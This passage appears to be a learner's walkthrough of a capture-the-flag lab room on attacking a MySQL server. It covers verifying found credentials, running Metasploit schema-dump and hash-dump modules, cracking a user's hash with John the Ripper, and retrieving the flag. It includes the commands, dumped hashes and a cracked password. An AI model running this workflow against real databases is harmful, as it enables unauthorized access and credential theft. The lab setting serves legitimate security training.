OS:CN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   26.33 ms 10.9.0.1
2   26.38 ms 10.10.14.213

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.83 seconds

```

---

_As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?_  

**3306**

_Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "_mysql -h [IP] -u [username] -p_"  

```bash
mysql -h [IP] -u [username] -p
```

![[Pasted image 20240703014705.png]]

_Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit._ 

_We're going to be using the "mysql_sql" module._


_Search for, select and list the options it needs. What three options do we need to set? (in descending order)._  

**PASSWORD/RHOSTS/USERNAME**

_Run the exploit. By default it will test with the "select version()" command, what result does this give you?_  

**5.7.29-0ubuntu0.18.04.1**

_Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?_

**4**

![[Pasted image 20240703020249.png]]

---

### Exploiting MySQL

**What do we know?**

Let's take a sanity check before moving on to try and exploit the database fully, and gain more sensitive information than just database names. We know:  

1. MySQL server credentials  

2. The version of MySQL running

3. The number of Databases, and their names.

**Key Terminology**

In order to understand the exploits we're going to use next- we need to understand a few key terms.

**Schema:**

> In MySQL, physically, a _schema_ is synonymous with a _database_. You can substitute the keyword "SCHEMA" instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE. It's important to understand this relationship because some other database products draw a distinction. For example, in the Oracle Database product, a _schema_ represents only a part of a database: the tables and other objects owned by a single user.

**Hashes:**  

Hashes are, very simply, the product of a cryptographic algorithm to turn a variable length input into a fixed length output.

In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data. This creates an index that is significantly smaller than the original data, allowing the values to be searched and accessed more efficiently

However, the data we're going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format.

Lets get cracking.

---

_First, let's search for and select the "mysql_schemadump" module. What's the module's full name?_  

**auxiliary/scanner/mysql/mysql_schemadump**

_Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?_  

**x$waits_global_by_latency**

_Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name?_

**auxiliary/scanner/mysql/mysql_hashdump**

_Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?_  

**Carl**

![[Pasted image 20240703021313.png]]

```php
[+] 10.10.14.213:3306 - Saving HashString as Loot: root:
[+] 10.10.14.213:3306 - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.14.213:3306 - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.14.213:3306 - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.14.213:3306 - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.14.213:3306 - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.14.213:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```



_Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called "hash.txt"._


_What is the user/hash combination string?_  

**carl:*EA031893AA21444B170FC2162A56978B8CEECE18**

_Now, we need to crack the password! Let's try John the Ripper against it using: "_john hash.txt_" what is the password of the user we found?

**carl:doggie**

![[Pasted image 20240703024401.png]]

_Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?_  

_What's the contents of MySQL.txt_

**THM{congratulations_you_got_the_mySQL_flag}**

![[Pasted image 20240703024524.png]]

---



**Further Reading**

Here's some things that might be useful to read after completing this room, if it interests you:

-  [https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/ch-exploits](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/ch-exploits)
-  [https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)  
    

**Thank you**  

Thanks for taking the time to work through this room, I wish you the best of luck in future.

~ Polo

